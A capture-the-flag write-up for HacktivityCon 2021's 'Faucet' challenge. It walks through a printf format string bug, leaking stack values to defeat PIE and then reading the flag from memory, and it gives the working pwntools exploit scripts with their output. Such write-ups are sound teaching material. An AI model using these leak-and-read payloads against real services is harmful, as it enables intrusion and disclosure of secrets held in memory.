# Faucet - HacktivityCon 2021

This is a writeup for "Faucet" challenge of HacktivityCon CTF 2021. 

I started off by disassembling the file using ghidra disassembler.

```main``` function:
```
undefined8 main(void)

{
  undefined4 uVar1;
  FILE *__stream;
  
  __stream = fopen("flag.txt","r");
  if (__stream == (FILE *)0x0) {
    puts("Failed to open the flag file.");
    return 1;
  }
  fgets(FLAG,0x100,__stream);
  fclose(__stream);
  puts(faucet);
  puts("*drip *drip *drip\n");
  puts("How are we going to fix this leaky faucet?");
  do {
    while (uVar1 = menu(), false) {
switchD_001016e8_caseD_0:
      puts("Invalid choice.\n");
    }
    switch(uVar1) {
    default:
      goto switchD_001016e8_caseD_0;
    case 1:
      use_hammer();
      break;
    case 2:
      use_wrench();
      break;
    case 3:
      use_bucket();
      break;
    case 4:
      call_plumber();
      break;
    case 5:
      buy_item();
    }
  } while( true );
}
```

I took a look at main and the other functions, which does not present any possible vulnerability except for the function ```buy item```. It seems like ```buy item``` takes in our input and prints it out using the ```printf``` function. This could mean that it is a format string vulenerability.

```buy_item``` function:
```
void buy_item(void)

{
  int iVar1;
  size_t sVar2;
  long in_FS_OFFSET;
  char local_38 [40];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  printf("What item would you like to buy?: ");
  fgets(local_38,0x20,stdin); **// retrieves 32 bytes of inputs from user**
  sVar2 = strcspn(local_38,"\n");
  local_38[sVar2] = '\0';
  iVar1 = strcmp(local_38,"hammer");
  if (iVar1 == 0) {
    hammer = 1;
  }
  else {
    iVar1 = strcmp(local_38,"wrench");
    if (iVar1 == 0) {
      wrench = 1;
    }
  }
  printf("You have bought a "); 
  printf(local_38); **// prints our input that was parsed**
  puts("\n");
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

I also noticed that the flag file is opened and stored at the location ```0x00104060``` in memory. This could mean that I would need to access the location of where the flag is stored in the memory using the prinf format string vulnerability.

Opening of ```FLAG``` file:
```
 __stream = fopen("flag.txt","r");
  if (__stream == (FILE *)0x0) {
    puts("Failed to open the flag file.");
    return 1;
  }
  fgets(FLAG,0x100,__stream);
  fclose(__stream);
```

Keeping that in mind, I did a check on the protections of the the binary file and noticed the following:
```
Arch:     amd64-64-little
RELRO:    Full RELRO                                                                                                    
Stack:    Canary found                                                                                                  
NX:       NX enabled                                                                                                    
PIE:      PIE enabled
```

It seems like all the protections are enabled, and of all of them, Position-Indpendent Executable (PIE) is also enabled, which means that the address of ```FLAG``` where it is stored is not simply ```0x00104060``` as PIE changes the base address of the binary file. 

I proceeded to print the stack values using the format string vulnerability of ```printf```.

Python script:
```
for i in range(21):
    r.sendlineafter(">", b"5")
    r.sendline("AAAABBBB %%%d$p" % i)
    r.recvuntil("a ")
    print("%d - %s" % (i, r.recvuntil("\n", drop = True).decode()))
```
Using the above python script, I obtained the following output.

Output:
```
0 - AAAABBBB %0$p                                                                                                       
1 - AAAABBBB 0x7ffe785b49c0                                                                                             
2 - AAAABBBB (nil)                                                                                                     
3 - AAAABBBB (nil)                                       
4 - AAAABBBB 0x12                                                                                                       
5 - AAAABBBB 0x12                                                                                                       
6 - AAAABBBB 0x4242424241414141                                                                                        
7 - AAAABBBB 0x7024372520                                                                                               
8 - AAAABBBB 0x5593be703740                                                                                             
9 - AAAABBBB 0x7ffe785b70b0                                                                                             
10 - AAAABBBB 0x5593be7031e0                                                                                           
11 - AAAABBBB 0x25f1343f94616b00 
12 - AAAABBBB 0x7ffe785b70b0      
13 - AAAABBBB 0x5593be703725     
14 - AAAABBBB 0x5785b71a0        
15 - AAAABBBB 0x5593bf3702a0   
16 - AAAABBBB (nil)              
17 - AAAABBBB 0x7fe9e98d40b3       
18 - AAAABBBB 0x7fe9e9ace620    
19 - AAAABBBB 0x7ffe785b71a8    
20 - AAAABBBB 0x100000000
21 - AAAABBBB 0x55dc9295b621     
22 - AAAABBBB 0x55dc9295b740   
23 - AAAABBBB 0xa15bf491b63955d4  
24 - AAAABBBB 0x55dc9295b1e0      
25 - AAAABBBB 0x7fffbdec0fd0
```
From the output we can see that our input is being stored at postion 6 of the stack. The character "A" is '0x41' and "B" is '0x42' in hexadecimal representation. This means that we are able to pass in the memory address of where the ```FLAG```is stored and access the memory address at the specific stack location (which was found to be 6), and possibly peek at the contents stored in there. We can peek at the contents at the memory address using the format string identifier "%s".

Now, to obtain the memory address of where the ```FLAG``` is stored, I noticed that at stack position 21, the last 3 digits seems to correspond to the last 3 digits of the ```main``` function address location in the disassembled binary file, which was ```0x00101621```. Thus, using this information, I can print out the location of the stack that stores the ```main``` memory address, and compute the base address of the binary. Then, using the base address of the binary, I will be able to compute the actual memory address of where the ```FLAG``` is stored.

So using the intel gathered, I computed the address of where the ```FLAG``` is stored, and attempted to print out the flag.

Payload:
```
# print out main addr
r.sendlineafter(">", b"5")
r.sendline("%21$lx")
r.recvuntil("a ")
ret = int(r.recvuntil("\n", drop = True).decode(), 16)
print("Main memory addr: ", hex(ret))

# calculating base address
elf.address = ret - elf.symbols.main
print("Base addr: ", hex(elf.address))

# payload
payload = p64(elf.symbols.FLAG)
payload += b"%6$s"
print("FLAG addr: ", hex(elf.symbols.FLAG))

# send payload to get flag
r.sendlineafter(">", b"5")
r.sendline(payload)

r.interactive()
```

However, the above payload did not work...

Output:
```
[*] '/root/hacktivity/faucet'
Arch:     amd64-64-little     
RELRO:    Full RELRO         
Stack:    Canary found       
NX:       NX enabled         
PIE:      PIE enabled      
[+] Opening connection to challenge.ctf.games on port 31569: Done    
Main memory addr:  0x561caf7bc621        
Base addr:  0x561caf7bb000              
FLAG addr:  0x561caf7bf060     
[*] Switching to interactive mode         
What item would you like to buy?: You have bought a `\x80b\xef\xa5U          
[1] Hit it with a hammer.      
[2] Tighten the pipe with a wrench.      
[3] Put a bucket under the leak.          
[4] Call a plumber.       
[5] Buy item from the hardware store.     
> $
```

From earlier, when I was printing out the addresses on the stack, I got ```AAAABBBB {Contents on stack}```, however, in this output, I got only the ```AAAABBBB``` portion. It seems like the ```printf``` got "terminated" halfway after printing our input.

I went on to print the byte code of the ```FLAG``` memory address.

```FLAG``` memory address in bytes:
```FLAG addr:  b'` \xd0\x1ckU\x00\x00'```

I noticed that ```\x00\x00``` are being appended to the back of the address, and because the arch of this binary is ```amd64-64-little```, it is using little endian byte-ordering, hence, the ```\x00\x00``` is being appended to the back of the address, which actually just means writing the FLAG address, eg. ```0x00561caf7bf060``` , backwards.

However, this poses as a problem for ```printf``` because ```printf``` stops printing when a NULL byte is reached, which explains, why our print "terminated" in the middle while printing the rest of our input.

I thought long and hard for a workaround, tried various modifications to my payload, and eventually discovered that I could simply pad my input with random 8 bytes, which sorts of "pushes" the ```FLAG``` memory address to the next stack location (i.e. 7) instead of 6 in my case. By doing so , I will be able to access and print the contents at the ```FLAG``` memory address that was push onto the stack location previously.

So now instead of passing ```%6$s``` as input, I pass ```%7$s``` as input, to print the flag.

Final Payload:
```
# print out main addr
r.sendlineafter(">", b"5")
r.sendline("%21$lx")
r.recvuntil("a ")
ret = int(r.recvuntil("\n", drop = True).decode(), 16)
print("Main memory addr: ", hex(ret))

# calculating base address
elf.address = ret - elf.symbols.main
print("Base addr: ", hex(elf.address))

# first payload
payload = b'A' * 8
payload += p64(elf.symbols.FLAG)

print("FLAG addr: ", hex(elf.symbols.FLAG))

# send payload to store FLAG address at stack offset 7
r.sendlineafter(">", b"5")
r.sendline(payload)

# second round payload to print the flag
payload2 = b'%7$s'

# send payload to print the flag
r.sendlineafter(">", b"5")
r.sendline(payload2)

r.interactive()
```

And finally, I got the flag!

Output:
```
[+] Opening connection to challenge.ctf.games on port 31517: Done   
Main memory addr:  0x56231551d621                       
Base addr:  0x56231551c000                  
FLAG addr:  0x562315520060   
[*] Switching to interactive mode                
What item would you like to buy?: You have bought a flag{6bc75f21f8839ce0db898a1950d11ccf}
```

For the full payload script, refer to the python file.
